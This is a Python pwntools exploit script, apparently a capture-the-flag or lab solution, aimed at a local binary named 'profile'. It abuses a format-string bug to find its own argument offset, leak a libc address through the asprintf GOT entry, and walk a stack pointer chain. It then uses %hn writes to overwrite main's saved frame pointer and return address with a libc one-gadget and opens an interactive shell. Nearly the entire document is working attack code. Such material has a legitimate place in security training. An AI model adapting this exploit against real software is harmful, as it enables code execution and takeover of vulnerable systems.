#!/usr/bin/env python3
from pwn import *

bin_fname = "./build/profile"
libc64 = "/lib/x86_64-linux-gnu/libc.so.6"  # symlink to 64 bit
context.binary = bin_fname
# context.terminal = ["tmux", "splitw", "-h"]

p = process(bin_fname)


def attack(fmt: bytes, *, finish=False):
    p.sendlineafter(b"specifier:", fmt)
    p.recvuntil(b"as...\n")
    display = p.recvuntil(b"\nAre you satisfied? (y/n) ", drop=True)
    p.sendline(b"y" if finish else b"n")
    return display

# asprintf(&char*, fmt, a1, a2, a3, a4, a5...)
# rdi, rsi, rdx, rcx, r8, r9
# std::string -> char **content -> "data"
# std::string defaults to char[16] on stack otherwise heap
# But copy of first 16 bytes may remain on stack regardless
# %11$p = rbp, %12$p = ret location

# Surprise! WTF https://stackoverflow.com/a/63060182 (even if mem alloc ok)

elf_bin = ELF(bin_fname)
elf_libc = ELF(libc64)

p.sendlineafter(b"username: ", b"Bob")

print()

# Dynamically find required argument number for fmt[8] (may rarely fail)
fmt_selfn = -1
max_tries = 20
for i in range(13, 13 + max_tries):
    needle = 0xa1b2c3d400b600 + randint(1, 255) + randint(1, 255) * 0x10000
    fmt_leak = f"%{i}$lx".encode().ljust(8, b"_") + p64(needle)
    leak = attack(fmt_leak).split(b"_", 1)[0]
    # success(f"{i:>2} {leak}")
    if leak == f"{needle:x}".encode():
        fmt_selfn = i
        break

assert fmt_selfn > 0
success(f"Use %{fmt_selfn}$ to target 8 bytes into fmt")

# Leak libc via asprintf GOT
got_asprintf = elf_bin.got["asprintf"]  # Prefer C function since no mangling
success(f"GOT asprintf @ {hex(got_asprintf)}")

fmt_leak = f"%{i}$s".encode().rjust(8, b"_") + p64(got_asprintf)
n_prefix = fmt_leak.find(b"%")  # Use index over strip() in case value overlap

leak = attack(fmt_leak)[n_prefix:n_prefix+6]    # 48 bit virtual address
lib_asprintf = u64(leak.ljust(8, b"\x00"))
elf_libc.address = lib_asprintf - elf_libc.sym["asprintf"]

success(f"LIB asprintf @ {hex(lib_asprintf)}")
success(f"LIB base adr @ {hex(elf_libc.address)}")

print()

#
# Strategy
#   a5 -> ak -> char username[]
#   Redirect ak to main()'s saved rbp via %5$n
#   Write any stack address via %k$n    (one gadget requires writable rbp-0x78)
#   Redirect ak to main()'s ret via %5$n
#   Write one gadget vi %k$n
#   Restore ak
#

# Find stack ptr chain
display_rbp = int(attack(b"%11$lx").decode(), 16)
pptr_uname = int(attack(b"%5$lx").decode(), 16)
ptr_uname = u64(attack(b"%5$s") + b"\x00\x00")  # 48 bit virt addr
success(f"  &&uname = {hex(pptr_uname)}")
success(f"   &uname = {hex(ptr_uname)}")
success(f"saved rbp = {hex(display_rbp)}")
assert display_rbp & 0xffff != 0xfff8   # avoid carry over in nibble unit

# Dynamically find required argument number for ptr_uname
fmt_uptrn = -1
max_tries = 20
for i in range(13, 13 + max_tries):
    fmt_leak = f"%{i}$lx".encode()
    leak = attack(fmt_leak)
    if leak == f"{ptr_uname:x}".encode():
        fmt_uptrn = i
        break

assert fmt_uptrn > 0
success(f"Use %{fmt_uptrn}$ to target &uname")

# one gadget: r10 == NULL && [rdx] == NULL <- unstable, too lazy to add rop
one_gadget = elf_libc.address + 0xebcf5
success(f"one gadget @ {hex(one_gadget)}")

print()

#
# Build format string
#
ptr_dest_lsn = [(display_rbp + x) & 0xffff for x in range(0, 11, 2)]
gadget_nibs_raw = [(display_rbp >> x) & 0xffff for x in range(0, 49, 16)] \
    + [one_gadget & 0xffff, (one_gadget >> 16) & 0xffff]
gadget_nibs = [x if x > 8 else x + 0x10000 for x in gadget_nibs_raw]

fmt_gadgets = sum((
    [f"%5${ptr}x%5$hn", f"%{fmt_uptrn}${val}x%{fmt_uptrn}$hn"]
    for ptr, val in zip(ptr_dest_lsn, gadget_nibs)
), []) + [f"%5${ptr_uname & 0xffff}x%5$hn"]
success("format components:\n" + '\n'.join(fmt_gadgets))
print()

# Launch and verify
fmt_ret = f"   %{fmt_selfn}$s".encode() + p64(display_rbp + 8)
main_ret = u64(attack(fmt_ret)[3:9] + b"\x00\x00")
main_rbp = u64(attack(b"%11$s").ljust(8, b"\x00"))  # Improper ptr
success(f"libc main ret   = {hex(elf_libc.sym['__libc_start_main'] - 0x30)}")
success(f"main ret before = {hex(main_ret)}")
success(f"main rbp before = {hex(main_rbp)}")
for x in fmt_gadgets:
    attack(x.encode())

main_ret = u64(attack(fmt_ret)[3:9] + b"\x00\x00")
success(f"main ret after  = {hex(main_ret)}")
main_rbp = u64(attack(b"%11$s") + b"\x00\x00")  # 48 bit virt addr
success(f"main rbp after  = {hex(main_rbp)}")
print()

attack(b"Pray!", finish=True)
p.interactive()
